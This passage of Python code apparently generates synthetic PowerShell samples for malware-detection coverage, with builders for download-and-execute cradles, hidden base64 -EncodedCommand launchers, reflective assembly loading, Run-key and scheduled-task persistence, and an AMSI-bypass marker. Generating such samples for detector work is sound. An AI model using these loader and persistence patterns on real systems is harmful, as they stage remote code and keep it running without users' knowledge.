                              " -UseBasicParsing" + ea + ").Content")
        elif variant == 2:
            statements.append("Invoke-Expression (New-Object System.Net.WebClient).DownloadString(" +
                              source + ")")
        elif variant == 3:
            statements.append("$" + script_v + " = (iwr " + source +
                              " -UseBasicParsing).Content")
            statements.append("[ScriptBlock]::Create($" + script_v + ").Invoke()")
        else:
            statements.append("$" + script_v +
                              " = (New-Object Net.WebClient).DownloadString(" +
                              source + ")")
            statements.append("& ([ScriptBlock]::Create($" + script_v + "))")
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "In-memory stage 2 script loader.",
                ["Retrieves the stage 2 script as text and invokes it in the",
                 "current session without writing the script to disk."],
            )
        entries = [
            ("string", url_v, url_q),
            ("int", timeout_v, str(timeout)),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        body = [
            "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
            "$ClientObject = New-Object System.Net.WebClient",
            '$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")',
            "$" + script_v + " = $ClientObject.DownloadString($SourceUrl)",
            "if ([string]::IsNullOrWhiteSpace($" + script_v + ")) {",
            '    throw "Downloaded script was empty"',
            "}",
            'Write-Verbose ("Script length: " + $' + script_v + '.Length)',
            "Invoke-Expression $" + script_v,
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "In-memory stage failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: resolved endpoint list, text fetch helper and invocation helper
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Endpoint-driven in-memory script loader.",
            ["Resolves the configured endpoint, downloads the stage 2 text",
             "with a bounded timeout, checks the returned length and then",
             "executes the script block in the current session."],
            notes=["No script content is written to disk."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", url_v, url_q),
        ("string", log_v, _log_expr(rng)),
        ("int", timeout_v, str(timeout)),
    ]
    lines += _config(rng, entries, p["param"])
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines += _function(
        rng,
        "Get-StageScriptText",
        [
            ("string", "SourceUrl", _q(rng, "")),
            ("int", "TimeoutSec", str(timeout)),
        ],
        [
            'Write-Verbose ("Fetching script text from " + $SourceUrl)',
            "$ClientObject = New-Object System.Net.WebClient",
            '$ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)',
            "return $ClientObject.DownloadString($SourceUrl)",
        ],
        comment=_section(rng, "Text retrieval") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Invoke-Stage2Script",
        [("string", "ScriptBody", _q(rng, ""))],
        [
            "if ([string]::IsNullOrWhiteSpace($ScriptBody)) {",
            '    throw "Stage 2 script body is empty"',
            "}",
            'Write-Verbose ("Script length: " + $ScriptBody.Length)',
            "$ScriptBlock = [ScriptBlock]::Create($ScriptBody)",
            "return $ScriptBlock.Invoke()",
        ],
        comment=_section(rng, "In-memory execution") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-Verbose "Starting in-memory stage"',
        "$" + script_v + " = Get-StageScriptText -SourceUrl $" + url_v +
        " -TimeoutSec $" + timeout_v,
        "$" + result_v + " = Invoke-Stage2Script -ScriptBody $" + script_v,
        'Write-Verbose "Stage result: $($' + result_v + ')"',
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "In-memory loader failed")
    lines += main
    lines.append("")
    lines += [
        "$LoadReport = [ordered]@{",
        '    Stage = "memory"',
        "    Endpoint = $" + url_v,
        "    ScriptLength = $" + script_v + ".Length",
        "}",
        "$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_encoded_stager(rng: random.Random) -> str:
    """Base64 / -EncodedCommand launchers with harmless stage text."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    url = _url(rng)
    marker = _pick(rng, (
        'Write-Verbose "stage one loaded"',
        'Write-Output "stage ready"',
        'Write-Verbose "encoded stage complete"',
        '# legacy AMSI marker kept for signature coverage',
        '$AmsiMarker = "amsiInitFailed"',
        'Start-Sleep -Milliseconds ' + str(rng.randint(80, 900)) +
        '; Write-Verbose "stage delay finished"',
        '$Stage2Url = "' + url + '"; Invoke-WebRequest -Uri $Stage2Url -OutFile "$env:TEMP\\stage2.bin" -UseBasicParsing',
    ))
    encoded_utf16 = _b64(marker, utf16=True)
    encoded_utf8 = _b64(marker, utf16=False)
    blob_v = _pick(rng, ENCODE_VARS)
    script_v = _pick(rng, ("DecodedText", "StageText", "ScriptBody", "PayloadText"))
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(10, 180)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", blob_v, _q(rng, encoded_utf16))]
            core = [
                "$" + script_v +
                " = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($" +
                blob_v + "))",
                "IEX $" + script_v,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(5)
        if variant == 0:
            statements.append("powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " +
                              encoded_utf16)
        elif variant == 1:
            statements.append("$" + blob_v + " = " + _q(rng, encoded_utf16))
            statements.append('Start-Process -FilePath "powershell.exe" -ArgumentList ' +
                              '("-NoP -EncodedCommand " + $' + blob_v +
                              ") -WindowStyle Hidden" + ea)
        elif variant == 2:
            statements.append("$" + script_v +
                              " = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(" +
                              _q(rng, encoded_utf16) + "))")
            statements.append("IEX $" + script_v)
        elif variant == 3:
            statements.append("[ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(" +
                              _q(rng, encoded_utf8) + "))).Invoke()")
        else:
            statements.append("$" + blob_v + " = " + _q(rng, encoded_utf16))
            statements.append("$" + script_v +
                              " = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($" +
                              blob_v + "))")
            statements.append("Invoke-Expression $" + script_v)
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    b64 = encoded_utf16
    parts = [b64[i:i + 76] for i in range(0, len(b64), 76)]
    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Encoded stage launcher.",
                ["Reassembles a base64 stage, decodes it as UTF-16 and",
                 "invokes the resulting text in the current session."],
            )
        if p["param"]:
            lines += _param_block(rng, [("int", "TimeoutSec", str(timeout))])
        lines.append("$" + blob_v + " = (")
        for i, part in enumerate(parts):
            suffix = " +" if i < len(parts) - 1 else ""
            lines.append("    " + _q(rng, part) + suffix)
        lines.append(")")
        lines.append("$" + script_v +
                     " = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($" +
                     blob_v + "))")
        body = [
            'Write-Verbose ("Decoded stage length: " + $' + script_v + ".Length)",
            "if ([string]::IsNullOrWhiteSpace($" + script_v + ")) {",
            '    throw "Decoded stage was empty"',
            "}",
            "Invoke-Expression $" + script_v,
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Encoded stage failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: encoder/decoder helpers, chunk assembly and a launcher
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Chunked encoded-stage workflow.",
            ["Assembles a base64 command from several fixed chunks, decodes",
             "the result into a PowerShell string and passes it to the",
             "stage invoker with bounded error handling."],
            notes=["The stage body is assembled at runtime."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", log_v, _log_expr(rng)),
        ("int", "TimeoutSec", str(timeout)),
    ]
    lines += _config(rng, entries, p["param"])
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines += _function(
        rng,
        "Expand-EncodedStage",
        [("string", "EncodedText", _q(rng, ""))],
        [
            'Write-Verbose ("Decoding " + $EncodedText.Length + " base64 characters")',
            "$StageBytes = [Convert]::FromBase64String($EncodedText)",
            "return [Text.Encoding]::Unicode.GetString($StageBytes)",
        ],
        comment=_section(rng, "Decoder") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Invoke-EncodedStage",
        [("string", "StageText", _q(rng, ""))],
        [
            "if ([string]::IsNullOrWhiteSpace($StageText)) {",
            '    throw "Decoded stage is empty"',
            "}",
            "$ScriptBlock = [ScriptBlock]::Create($StageText)",
            "return $ScriptBlock.Invoke()",
        ],
        comment=_section(rng, "Invoker") if p["comments"] else None,
    )
    lines.append("")
    lines.append("$" + blob_v + " = (")
    for i, part in enumerate(parts):
        suffix = " +" if i < len(parts) - 1 else ""
        lines.append("    " + _q(rng, part) + suffix)
    lines.append(")")
    lines.append("")
    main = [
        'Write-Verbose "Starting encoded-stage workflow"',
        "if (-not [string]::IsNullOrWhiteSpace($" + blob_v + ")) {",
        "$" + script_v + " = Expand-EncodedStage -EncodedText $" + blob_v,
        "$" + result_v + " = Invoke-EncodedStage -StageText $" + script_v,
        '}',
        "else {",
        '    Write-Warning "Encoded stage blob is empty"',
        "}",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Encoded workflow failed")
    lines += main
    lines.append("")
    lines += [
        "$EncodedReport = [ordered]@{",
        '    Stage = "encoded"',
        "    BlobLength = $" + blob_v + ".Length",
        "    TimeoutSec = $TimeoutSec",
        "}",
        "$EncodedReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


# === BUILDERS_2 ===


def _native_cs(rng: random.Random, methods, class_name: str | None = None) -> str:
    class_name = class_name or _pick(rng, ("NativeApi", "NativeMethods",
                                          "Win32Api", "PlatformApi"))
    lines = ["using System;", "using System.Runtime.InteropServices;", "",
             "public static class " + class_name, "{"]
    for i, method in enumerate(methods):
        if i:
            lines.append("")
        lines.append('    [DllImport("kernel32.dll")]')
        lines.append("    public static extern uint " + method + "();")
    lines.append("}")
    return "\n".join(lines)


def _persist_script(rng: random.Random) -> tuple[str, str]:
    raw = "$env:APPDATA\\" + _pick(rng, SCRIPT_NAMES)
    return '"' + raw + '"', raw


def build_addtype_loader(rng: random.Random) -> str:
    """Add-Type + harmless kernel32 DllImport loader samples."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    class_name = _pick(rng, ("NativeApi", "NativeMethods", "Win32Api",
                             "PlatformApi"))
    method = _pick(rng, ("GetTickCount", "GetCurrentProcessId",
                         "GetCurrentThreadId", "GetVersion"))
    cs_one = ('using System; using System.Runtime.InteropServices; public static class ' +
              class_name + ' { [DllImport("kernel32.dll")] public static extern uint ' +
              method + '(); }')
    cs_multi = _native_cs(rng, [method], class_name)
    second_method = "GetTickCount" if method != "GetTickCount" else "GetCurrentProcessId"
    cs_dual = _native_cs(rng, [method, second_method], class_name)
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(10, 180)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        statements = []
        if rng.random() < 0.6:
            code = _q(rng, cs_one)
            statements.append("$NativeCode = " + code)
            type_arg = "$NativeCode"
        else:
            type_arg = _q(rng, cs_one)
        statements.append("Add-Type -TypeDefinition " + type_arg +
                          " -Language CSharp" + ea)
        statements.append("$" + result_v + " = [" + class_name + "]::" +
                          method + "()")
        if rng.random() < 0.03:
            statements.append('$AmsiMarker = "amsiInitFailed"')
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Native API compile-and-invoke helper.",
                ["Compiles a small C# shim against kernel32, then calls a",
                 "harmless timestamp/process identifier function."],
            )
        if p["param"]:
            lines += _param_block(rng, [("int", "TimeoutSec", str(timeout))])
        lines.append("$NativeCode = @'")
        lines += cs_multi.splitlines()
        lines.append("'@")
        lines.append("")
        body = [
            "Add-Type -TypeDefinition $NativeCode -Language CSharp" + ea,
            "$" + result_v + " = [" + class_name + "]::" + method + "()",
            'Write-Verbose ("Native result: " + $' + result_v + ")",
        ]
        if rng.random() < 0.03:
            body.append('$AmsiMarker = "amsiInitFailed"')
        if p["trycatch"]:
            body = _try_catch(rng, body, "Native helper failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: compile shim, exercise it from two helpers, report state
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Native shim loader with staged buffer preparation.",
            ["Builds a C# helper from an embedded source block, calls two",
             "harmless kernel32 exports, prepares an in-memory byte buffer",
             "and writes a compact diagnostic report."],
            notes=["The buffer is populated at runtime."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", log_v, _log_expr(rng)),
        ("int", "TimeoutSec", str(timeout)),
    ]
    lines += _config(rng, entries, p["param"])
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines.append("$NativeCode = @'")
    lines += cs_dual.splitlines()
    lines.append("'@")
    lines.append("Add-Type -TypeDefinition $NativeCode -Language CSharp" + ea)
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Get-NativeTimestamp",
        [],
        [
            "$NativeValue = [" + class_name + "]::" + method + "()",
            'Write-Verbose ("Native call returned " + $NativeValue)',
            "return $NativeValue",
        ],
        comment=_section(rng, "Timestamp helper") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Initialize-StageBuffer",
        [("int", "BufferSize", "256")],
        [
            "$StageBuffer = New-Object byte[] $BufferSize",
            "for ($Index = 0; $Index -lt $StageBuffer.Length; $Index++) {",
            "    $StageBuffer[$Index] = [byte](Get-Random -Minimum 0 -Maximum 255)",
            "}",
            'Write-Verbose ("Buffer length: " + $StageBuffer.Length)',
            "return $StageBuffer",
        ],
        comment=_section(rng, "Stage buffer") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting native shim stage"',
        "$" + result_v + " = Get-NativeTimestamp",
        "$StageBuffer = Initialize-StageBuffer -BufferSize 256",
        'Write-StageLog -Message ("Buffer bytes: " + $StageBuffer.Length)',
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Native shim stage failed")
    lines += main
    lines.append("")
    lines += [
        "$NativeReport = [ordered]@{",
        '    Stage = "native"',
        "    Module = $NativeCode.Length",
        "    Result = $" + result_v,
        "    BufferBytes = $StageBuffer.Length",
        "}",
        "$NativeReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_assembly_loader(rng: random.Random) -> str:
    """Reflective Assembly.Load loaders over placeholder byte blobs."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    b64 = base64.b64encode(
        ("stage2-marker:" + _token(rng, 10)).encode("ascii")
    ).decode("ascii")
    url = _url(rng, "payload.bin")
    url_v = _pick(rng, URL_VARS)
    bytes_v = _pick(rng, ("AssemblyBytes", "StageBytes", "PayloadBytes",
                          "ManagedBytes"))
    result_v = _pick(rng, RESULT_VARS)
    timeout = rng.randint(10, 180)
    url_q = _q(rng, url)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""

    if bucket == "short":
        if p["param"]:
            entries = [("string", url_v, url_q)]
            core = [
                "$" + bytes_v +
                " = (New-Object System.Net.WebClient).DownloadData($" + url_v + ")",
                "[Reflection.Assembly]::Load($" + bytes_v + ")",
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(4)
        if variant == 0:
            statements.append("$" + bytes_v +
                              " = [Convert]::FromBase64String(" + _q(rng, b64) + ")")
            statements.append("[Reflection.Assembly]::Load($" + bytes_v + ")")
        elif variant == 1:
            statements.append("$" + bytes_v +
                              " = (New-Object System.Net.WebClient).DownloadData(" +
                              url_q + ")")
            statements.append("[Reflection.Assembly]::Load($" + bytes_v + ")")
        elif variant == 2:
            statements.append("$" + bytes_v +
                              " = [Convert]::FromBase64String(" + _q(rng, b64) + ")")
            statements.append("$" + result_v + " = [Reflection.Assembly]::Load($" +
                              bytes_v + ")")
            statements.append("$" + result_v + ".GetTypes().Count")
        else:
            statements.append("$" + bytes_v +
                              " = [Convert]::FromBase64String(" + _q(rng, b64) + ")")
            statements.append('Write-Verbose ("Assembly bytes: " + $' + bytes_v + ".Length)")
            statements.append("[Reflection.Assembly]::Load($" + bytes_v + ")")
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Reflective managed assembly loader.",
                ["Obtains a managed payload stage, loads it into the current",
                 "AppDomain and inspects the exported type count."],
            )
        entries = [("string", url_v, url_q)]
        if p["param"]:
            entries.append(("int", "TimeoutSec", str(timeout)))
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        body = [
            "$" + bytes_v + " = [Convert]::FromBase64String(" + _q(rng, b64) + ")",
            'Write-Verbose ("Assembly byte count: " + $' + bytes_v + ".Length)",
            "$" + result_v + " = [Reflection.Assembly]::Load($" + bytes_v + ")",
            "if ($null -ne $" + result_v + ") {",
            '    Write-Verbose ("Loaded assembly: " + $' + result_v + ".FullName)",
            "}",
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Assembly load failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: byte acquisition, validated load and guarded entry-point invocation
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Managed assembly acquisition and reflection workflow.",
            ["Downloads or decodes a managed payload stage, loads it into the",
             "current AppDomain, then looks for a conventional entry method",
             "and invokes it only when present."],
            notes=["The loader expects a managed payload stage."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", url_v, url_q),
        ("string", log_v, _log_expr(rng)),
        ("int", "TimeoutSec", str(timeout)),
    ]
    lines += _config(rng, entries, p["param"])
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines += _function(
        rng,
        "Get-StageAssemblyBytes",
        [("string", "SourceUrl", _q(rng, "")),
         ("int", "TimeoutSec", str(timeout))],
        [
            'Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)',
            "$ClientObject = New-Object System.Net.WebClient",
            '$ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)',
            "return $ClientObject.DownloadData($SourceUrl)",
        ],
        comment=_section(rng, "Acquisition") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Invoke-AssemblyEntryPoint",
        [("object", "LoadedAssembly", "$null")],
        [
            "if ($null -eq $LoadedAssembly) {",
            '    throw "Loaded assembly is null"',
            "}",
            "$Types = $LoadedAssembly.GetTypes()",
            "if ($Types.Length -gt 0) {",
            '    $EntryMethod = $Types[0].GetMethod("Run")',
            "    if ($null -ne $EntryMethod) {",
            "        Write-Verbose \"Invoking entry method\"",
            "        return $EntryMethod.Invoke($null, @())",
            "    }",
            "}",
            'Write-Verbose "No conventional entry method found"',
            "return $null",
        ],
        comment=_section(rng, "Reflection") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-Verbose "Starting managed loader"',
        "$" + bytes_v + " = [Convert]::FromBase64String(" + _q(rng, b64) + ")",
        'Write-Verbose ("Assembly byte count: " + $' + bytes_v + ".Length)",
        "$" + result_v + " = [Reflection.Assembly]::Load($" + bytes_v + ")",
        "$EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $" + result_v,
        'Write-Verbose ("Entry result: " + $EntryResult)',
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Managed loader failed")
    lines += main
    lines.append("")
    lines += [
        "$AssemblyReport = [ordered]@{",
        '    Stage = "reflection"',
        "    ByteCount = $" + bytes_v + ".Length",
        "    Endpoint = $" + url_v,
        "}",
        "$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_registry_persistence(rng: random.Random) -> str:
    """HKCU Run-key persistence samples with benign per-user targets."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    value_name = _pick(rng, VALUE_NAMES)
    script_expr, script_raw = _persist_script(rng)
    payload_expr, payload_raw = _artifact(rng, "payload")
    result_v = _pick(rng, RESULT_VARS)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""
    value_q = _q(rng, value_name)

    if bucket == "short":
        if p["param"]:
            entries = [("string", "PersistencePath", script_expr),
                       ("string", "RegistryValue", value_q)]
            core = [
                "New-ItemProperty -Path " + _q(rng, RUN_KEY) +
                " -Name $RegistryValue -Value $PersistencePath" +
                " -PropertyType String -Force" + ea,
                "Get-ItemProperty -Path " + _q(rng, RUN_KEY) +
                " -Name $RegistryValue" + ea,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        if rng.random() < 0.55:
            statements.append("Copy-Item -Path " + payload_expr +
                              " -Destination " + script_expr + " -Force" + ea)
        variant = rng.randrange(3)
        if variant == 0:
            statements.append("Set-ItemProperty -Path " + _q(rng, RUN_KEY) +
                              " -Name " + value_q + " -Value " +
                              _run_value_expr(script_expr) + " -Force" + ea)
        elif variant == 1:
            statements.append("New-ItemProperty -Path " + _q(rng, RUN_KEY) +
                              " -Name " + value_q + " -Value " +
                              _run_value_expr(script_expr) +
                              " -PropertyType String -Force" + ea)
        else:
            statements.append("reg.exe add " + _q(rng, RUN_KEY_CMD) +
                              " /v " + value_q + " /t REG_SZ /d " +
                              _dq("powershell.exe -NoP -WindowStyle Hidden -File " +
                                  script_raw) + " /f")
        if rng.random() < 0.5:
            statements.append("Get-ItemProperty -Path " + _q(rng, RUN_KEY) +
                              " -Name " + value_q + ea)
        statements += _extras(rng, rng.randint(1, 2))
        if p["trycatch"]:
            statements = _join_catch(rng, statements)
        return _short_script(rng, statements, p["comments"])

    if bucket == "medium":
        lines = []
        if p["comments"]:
            lines += _help_block(
                rng,
                "Per-user Run-key persistence helper.",
                ["Copies the launcher into the roaming profile and",
                 "registers it under the current user's Run key."],
            )
        entries = [
            ("string", "RunKeyPath", _q(rng, RUN_KEY)),
            ("string", "RegistryValue", value_q),
            ("string", "PersistencePath", script_expr),
        ]
        lines += _config(rng, entries, p["param"])
        lines.append('$ErrorActionPreference = "Stop"')
        lines.append("")
        body = [
            'Write-Verbose "Installing per-user persistence"',
            "if (-not (Test-Path -Path $PersistencePath)) {",
            "    Copy-Item -Path " + payload_expr + " -Destination $PersistencePath -Force",
            "}",
            "New-ItemProperty -Path $RunKeyPath -Name $RegistryValue" +
            " -Value " + _run_value_expr("$PersistencePath") +
            " -PropertyType String -Force" + ea,
            "$" + result_v + " = Get-ItemProperty -Path $RunKeyPath" +
            " -Name $RegistryValue" + ea,
            'Write-Verbose ("Registered value: " + $' + result_v + ".$RegistryValue)",
        ]
        if p["trycatch"]:
            body = _try_catch(rng, body, "Run-key installation failed")
        lines += body
        lines.append("")
        lines += _extras(rng, rng.randint(1, 3))
        return _coerce_medium(lines, rng)

    # long: staged install, registry write and verification helpers
    lines = []
    if p["comments"]:
        lines += _help_block(
            rng,
            "Run-key persistence workflow.",
            ["Installs the launcher under the roaming profile,",
             "writes the Run-key value, then re-reads the value to confirm",
             "that the registration is present."],
            notes=["Targets are limited to the current user's profile."],
        )
    log_v = _pick(rng, LOG_PATH_VARS)
    entries = [
        ("string", "RunKeyPath", _q(rng, RUN_KEY)),
        ("string", "RegistryValue", value_q),
        ("string", "PersistencePath", script_expr),
        ("string", log_v, _log_expr(rng)),
    ]
    lines += _config(rng, entries, p["param"], mandatory=rng.random() < 0.3)
    lines.append('$ErrorActionPreference = "Stop"')
    lines.append("")
    lines += _function(
        rng,
        "Write-StageLog",
        [("string", "Message", _q(rng, ""))],
        [
            "Write-Verbose $Message",
            'Add-Content -Path $' + log_v + ' -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)',
        ],
        comment=_section(rng, "Diagnostics") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Install-StagePayload",
        [("string", "SourcePath", _q(rng, "")),
         ("string", "DestinationPath", _q(rng, ""))],
        [
            "if (-not (Test-Path -Path $SourcePath)) {",
            '    throw "Source payload is missing"',
            "}",
            "Copy-Item -Path $SourcePath -Destination $DestinationPath -Force",
            "return (Test-Path -Path $DestinationPath)",
        ],
        comment=_section(rng, "Payload install") if p["comments"] else None,
    )
    lines.append("")
    lines += _function(
        rng,
        "Set-RunKeyPersistence",
        [("string", "KeyPath", _q(rng, "")),
         ("string", "ValueName", _q(rng, "")),
         ("string", "TargetPath", _q(rng, ""))],
        [
            'Write-Verbose ("Writing Run value " + $ValueName)',
            "New-ItemProperty -Path $KeyPath -Name $ValueName" +
            " -Value " + _run_value_expr("$TargetPath") +
            " -PropertyType String -Force" + ea,
            "return (Get-ItemProperty -Path $KeyPath -Name $ValueName" + ea + ")",
        ],
        comment=_section(rng, "Registry write") if p["comments"] else None,
    )
    lines.append("")
    main = [
        'Write-StageLog -Message "Starting persistence stage"',
        "$InstallResult = Install-StagePayload -SourcePath " + payload_expr +
        " -DestinationPath $" + "PersistencePath",
        "if ($InstallResult) {",
        "    $" + result_v + " = Set-RunKeyPersistence -KeyPath $RunKeyPath" +
        " -ValueName $RegistryValue -TargetPath $PersistencePath",
        '    Write-StageLog -Message "Run key written"',
        "}",
        "else {",
        '    Write-Warning "Payload copy did not complete"',
        "}",
    ]
    if p["trycatch"]:
        main = _try_catch(rng, main, "Persistence workflow failed")
    lines += main
    lines.append("")
    lines += [
        "$PersistenceReport = [ordered]@{",
        '    Stage = "persistence"',
        "    RunKey = $RunKeyPath",
        "    ValueName = $RegistryValue",
        "    Target = $PersistencePath",
        "}",
        "$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $" +
        log_v + " -Append",
    ]
    lines += _verbose_tail(rng)
    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


def build_scheduled_task(rng: random.Random) -> str:
    """Scheduled-task persistence samples pointing at benign drop paths."""
    bucket = _bucket(rng)
    p = _profile(rng, bucket)
    task_name = _pick(rng, TASK_NAMES)
    script_expr, script_raw = _persist_script(rng)
    ps_cmd = _ps_file_command(script_raw)
    ps_cmd_q = '"' + ps_cmd + '"'
    task_q = _q(rng, task_name)
    ea = " -ErrorAction SilentlyContinue" if p["ea"] else ""
    trigger_minutes = rng.randint(3, 90)

    if bucket == "short":
        if p["param"]:
            entries = [("string", "TaskName", task_q),
                       ("string", "ScriptPath", script_expr)]
            core = [
                '$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe"' +
                ' -Argument ("-NoP -WindowStyle Hidden -File `"" + $ScriptPath + "`"")',
                "Register-ScheduledTask -TaskName $TaskName -Action $TaskAction" +
                " -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force" + ea,
            ]
            core += _extras(rng, 1)
            if p["trycatch"]:
                core = _join_catch(rng, core)
            return _short_param_script(rng, entries, core, p["comments"])
        statements = []
        variant = rng.randrange(4)
        if variant == 0:
            statements.append("schtasks.exe /Create /TN " + task_q + " /TR " +
                              ps_cmd_q + " /SC ONLOGON" +
                              (" /RU $env:USERNAME" if rng.random() < 0.4 else "") +
                              " /F")
        elif variant == 1:
            statements.append("$TaskAction = New-ScheduledTaskAction" +
                              ' -Execute "powershell.exe" -Argument ' +
                              '"' + ps_cmd + '"')
            statements.append("$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn")
            statements.append("Register-ScheduledTask -TaskName " + task_q +
                              " -Action $TaskAction -Trigger $TaskTrigger -Force" + ea)
        elif variant == 2:
            statements.append("$TaskAction = New-ScheduledTaskAction" +
                              ' -Execute "powershell.exe" -Argument ' +
                              '"' + ps_cmd + '"')
            statements.append("$TaskTrigger = New-ScheduledTaskTrigger -Once" +
                              " -At (Get-Date).AddMinutes(" + str(trigger_minutes) + ")")
            statements.append("Register-ScheduledTask -TaskName " + task_q +
                              " -Action $TaskAction -Trigger $TaskTrigger -Force" + ea)
        else:
            payload_expr, _ = _artifact(rng, "payload")
            statements.append("Copy-Item -Path " + payload_expr +
                              " -Destination " + script_expr + " -Force" + ea)
            statements.append("schtasks.exe /Create /TN " + task_q + " /TR " +
                              ps_cmd_q + " /SC ONLOGON /F")
        statements += _extras(rng, rng.randint(1, 2))
